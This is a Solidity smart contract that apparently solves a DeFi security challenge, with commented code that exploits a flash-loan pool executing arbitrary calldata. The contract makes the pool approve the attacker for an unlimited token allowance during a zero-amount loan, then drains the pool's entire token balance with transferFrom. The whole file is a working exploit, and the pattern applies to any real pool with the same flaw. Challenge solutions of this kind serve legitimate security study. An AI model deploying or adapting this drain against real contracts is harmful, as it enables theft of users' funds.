// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract TrustedAttacker {
    
    IPool immutable pool;
    IERC20 immutable token;
    address private attacker;

    constructor(address _poolAddress, address _tokenAddress) {
        pool = IPool(_poolAddress);
        token = IERC20(_tokenAddress);
        attacker = msg.sender;
    }

    function attack() external {
        // Henryk: encode the amount as the max unsigned int to approve which will be
        // executed by the pool. We can just do the amount of the balance but I just did
        // max for fun
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256-1);

        // Henryk: Taking out a "0" loan so I don't have to have an extra line of code
        // to transfer the flash loan amount back. I only care about the pool executing
        // my encoded data against the target ERC20 token
        pool.flashLoan(0, address(this), address(token), data);

        // Henryk: drain the pool now that it has executed "approve" on the ERC20 token for us
        uint balance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), attacker, balance);
    }
}
